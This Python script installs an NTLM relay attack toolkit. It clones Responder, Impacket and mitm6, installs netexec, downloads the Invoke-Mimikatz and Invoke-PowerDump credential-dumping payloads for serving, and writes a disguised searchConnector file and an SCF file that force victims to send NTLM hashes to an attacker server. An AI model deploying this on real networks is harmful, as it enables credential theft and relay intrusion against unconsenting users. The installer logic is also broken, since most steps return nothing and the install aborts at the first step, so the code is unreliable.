#!/usr/bin/env python3

import os
import sys
import shutil
import subprocess
from pathlib import Path
from threading import Thread
from termcolor import colored

class ToolkitInstaller:
    def __init__(self):
        self.base_dir = Path(__file__).parent.absolute()
        self.tools_dir = self.base_dir / 'tools'
        self.web_dir = self.base_dir / 'web'
        self.logs_dir = self.base_dir / 'logs'
        self.certs_dir = self.base_dir / 'certs'
        
        # Tool repositories
        self.tools = {
            'Responder': 'https://github.com/lgandx/Responder.git',
            'Impacket': 'https://github.com/fortra/impacket.git',
            'mitm6': 'https://github.com/dirkjanm/mitm6.git'
        }
        
        # Python packages
        self.requirements = [
            'termcolor',
            'netifaces',
            'requests',
            'pyasn1',
            'pycryptodomex',
            'ldap3',
            'dsinternals',
            'pyOpenSSL',
            'pipx'
        ]

    def print_banner(self):
        banner = """
╔═══════════════════════════════════════════╗
║     NTLM Relay Toolkit - Installer        ║
║     [*] Setting up your environment...    ║
╚═══════════════════════════════════════════╝
        """
        print(colored(banner, 'blue'))

    def print_status(self, message, status="info"):
        colors = {
            "info": "blue",
            "success": "green",
            "error": "red",
            "warning": "yellow"
        }
        print(colored(f"[*] {message}", colors.get(status, "blue")))

    def run_command(self, command, cwd=None, shell=False):
        try:
            subprocess.run(
                command,
                cwd=cwd,
                shell=shell,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            return True
        except subprocess.CalledProcessError as e:
            self.print_status(f"Error running {command}: {e}", "error")
            return False

    def check_requirements(self):
        """Check system requirements"""
        if os.geteuid() != 0:
            self.print_status("This script must be run as root", "error")
            sys.exit(1)
            
        # Check for git
        if not shutil.which('git'):
            self.print_status("Git is required. Please install git first.", "error")
            sys.exit(1)

        # Check for pip
        if not shutil.which('pip3'):
            self.print_status("pip3 is required. Please install python3-pip first.", "error")
            sys.exit(1)

    def create_directory_structure(self):
        """Create required directories"""
        dirs = [
            self.tools_dir,
            self.web_dir / 'payloads',
            self.web_dir / 'templates',
            self.logs_dir,
            self.certs_dir
        ]
        
        for directory in dirs:
            directory.mkdir(parents=True, exist_ok=True)
            self.print_status(f"Created directory: {directory}", "success")

    def install_python_packages(self):
        """Install required Python packages"""
        self.print_status("Installing Python packages...")
        
        for package in self.requirements:
            self.print_status(f"Installing {package}...")
            if not self.run_command(['pip3', 'install', package]):
                self.print_status(f"Failed to install {package}", "error")
                return False
        
        return True

    def install_netexec(self):
        """Install netexec using pipx"""
        self.print_status("Installing netexec...")
        commands = [
            ['pipx', 'install', 'netexec'],
            ['pipx', 'ensurepath']
        ]
        
        for cmd in commands:
            if not self.run_command(cmd):
                self.print_status("Failed to install netexec", "error")
                return False
                
        return True

    def setup_tools(self):
        """Clone and setup required tools"""
        os.chdir(self.tools_dir)
        
        for tool, repo in self.tools.items():
            self.print_status(f"Setting up {tool}...")
            
            # Clone repository
            if not self.run_command(['git', 'clone', repo, tool]):
                continue
                
            # Special handling for certain tools
            if tool == 'Impacket':
                os.chdir(tool)
                self.run_command(['pip3', 'install', '.'])
                os.chdir('..')
            elif tool == 'mitm6':
                os.chdir(tool)
                self.run_command(['pip3', 'install', '-e', '.'])
                os.chdir('..')
                
        os.chdir(self.base_dir)

    def setup_payloads(self):
        """Setup PowerShell payloads"""
        payloads = {
            'Invoke-PowerDump.ps1': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-PowerDump.ps1',
            'Invoke-Mimikatz.ps1': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
        }
        
        for payload, url in payloads.items():
            self.print_status(f"Downloading {payload}...")
            self.run_command(['wget', url, '-O', str(self.web_dir / 'payloads' / payload)])

    def create_config_files(self):
        """Create configuration files"""
        # WebDAV template
        webdav_template = """<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<iconReference>imageres.dll,-1002</iconReference>
<templateInfo>
<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
</templateInfo>
<simpleLocation>
<url>https://{server}/{path}</url>
</simpleLocation>
</searchConnectorDescription>"""

        # SCF template
        scf_template = """[Shell]
Command=2
IconFile=\\\\{server}\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop"""

        # Write templates
        (self.web_dir / 'templates' / 'webdav.xml').write_text(webdav_template)
        (self.web_dir / 'templates' / 'scf.xml').write_text(scf_template)

    def set_permissions(self):
        """Set correct permissions for files and directories"""
        permissions = {
            'relay.py': 0o755,
            'web': 0o755,
            'certs': 0o700,
            'tools': 0o755
        }
        
        for path, perm in permissions.items():
            path = self.base_dir / path
            if path.exists():
                os.chmod(path, perm)
                if path.is_dir():
                    for item in path.rglob('*'):
                        os.chmod(item, perm)

    def backup_configs(self):
        """Backup original configuration files"""
        responder_conf = self.tools_dir / 'Responder' / 'Responder.conf'
        if responder_conf.exists():
            shutil.copy(responder_conf, str(responder_conf) + '.bak')

    def verify_installation(self):
        """Verify tool installations"""
        tools_to_check = {
            'responder': ['responder', '-h'],
            'ntlmrelayx': ['ntlmrelayx.py', '-h'],
            'mitm6': ['mitm6', '-h'],
            'netexec': ['nxc', '-h']
        }
        
        for tool, command in tools_to_check.items():
            if not shutil.which(command[0]):
                self.print_status(f"{tool} installation verification failed", "error")
                return False
                
        return True

    def install(self):
        """Main installation process"""
        self.print_banner()
        self.check_requirements()
        
        steps = [
            (self.create_directory_structure, "Creating directory structure"),
            (self.install_python_packages, "Installing Python packages"),
            (self.install_netexec, "Installing netexec"),
            (self.setup_tools, "Setting up external tools"),
            (self.setup_payloads, "Setting up payloads"),
            (self.create_config_files, "Creating configuration files"),
            (self.set_permissions, "Setting permissions"),
            (self.backup_configs, "Backing up configurations"),
            (self.verify_installation, "Verifying installation")
        ]
        
        for step, description in steps:
            self.print_status(description)
            if not step():
                self.print_status(f"Failed at: {description}", "error")
                return False
                
        self.print_status("Installation completed successfully!", "success")
        return True

def main():
    installer = ToolkitInstaller()
    installer.install()

if __name__ == "__main__":
    main()
